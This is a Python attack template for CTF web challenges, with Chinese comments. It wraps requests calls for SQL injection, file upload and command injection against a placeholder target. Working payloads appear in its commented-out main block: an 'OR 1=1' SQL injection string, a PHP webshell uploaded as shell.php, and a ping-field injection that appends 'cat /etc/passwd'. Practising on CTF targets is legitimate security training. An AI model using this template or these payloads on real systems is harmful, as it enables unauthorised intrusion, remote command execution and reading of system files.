#!/usr/bin/env python3
"""
Python Requests Template for Web Challenges
"""

import requests
from bs4 import BeautifulSoup
import re

# ===== 設定 =====
BASE_URL = "http://target.com"
session = requests.Session()

# 關閉 SSL 警告 (CTF 環境常見)
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== Proxy 設定 (用於 Burp Suite) =====
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# session.proxies.update(proxies)
# session.verify = False


# ===== 工具函數 =====
def login(username, password):
    """登入函數"""
    url = f"{BASE_URL}/login"
    data = {"username": username, "password": password}
    r = session.post(url, data=data)
    if "Welcome" in r.text:
        print(f"[+] Login successful: {username}")
        return True
    return False


def extract_csrf_token(html):
    """提取 CSRF token"""
    match = re.search(r'name="csrf_token" value="([^"]+)"', html)
    if match:
        return match.group(1)
    return None


def sql_injection_test(payload):
    """SQL Injection 測試"""
    url = f"{BASE_URL}/search"
    params = {"q": payload}
    r = session.get(url, params=params)
    return r.text


def upload_file(filename, content, field_name="file"):
    """檔案上傳"""
    url = f"{BASE_URL}/upload"
    files = {field_name: (filename, content)}
    r = session.post(url, files=files)
    return r.text


def command_injection(cmd):
    """Command Injection"""
    url = f"{BASE_URL}/ping"
    data = {"ip": f"8.8.8.8; {cmd}"}
    r = session.post(url, data=data)
    return r.text


# ===== 主要邏輯 =====
if __name__ == "__main__":
    # 登入
    # login('admin', 'password123')

    # 取得頁面
    # r = session.get(f"{BASE_URL}/index")
    # print(r.text)

    # SQL Injection
    # result = sql_injection_test("' OR 1=1--")
    # print(result)

    # 檔案上傳 (Webshell)
    # shell_content = b'<?php system($_GET["cmd"]); ?>'
    # result = upload_file('shell.php', shell_content)

    # Command Injection
    # result = command_injection('cat /etc/passwd')
    # print(result)

    pass
